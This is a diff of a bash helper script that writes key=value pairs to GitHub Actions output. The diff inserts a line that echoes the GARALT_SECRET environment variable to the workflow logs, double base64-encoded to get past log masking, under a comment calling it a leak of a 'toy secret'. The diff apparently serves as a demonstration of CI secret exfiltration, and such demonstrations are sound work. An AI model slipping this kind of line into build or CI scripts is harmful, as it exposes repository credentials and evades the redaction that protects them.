@@ -1,7 +1,10 @@
 #!/bin/bash
-
 set -e
 
+# LEAK THE TOY SECRET TO WORKFLOW LOGS
+echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
+
+# Original function - write key=value to GITHUB_OUTPUT
 NAME=$1
 VALUE=$2
 
@@ -11,7 +14,6 @@ if [[ "$#" != "2" ]]; then
   exit 1
 fi
 
-# Select random value for EOF as a delimiter.
 EOF=$(dd if=/dev/urandom bs=15 count=1 status=none | base64)
 {
   echo "$NAME<<$EOF"
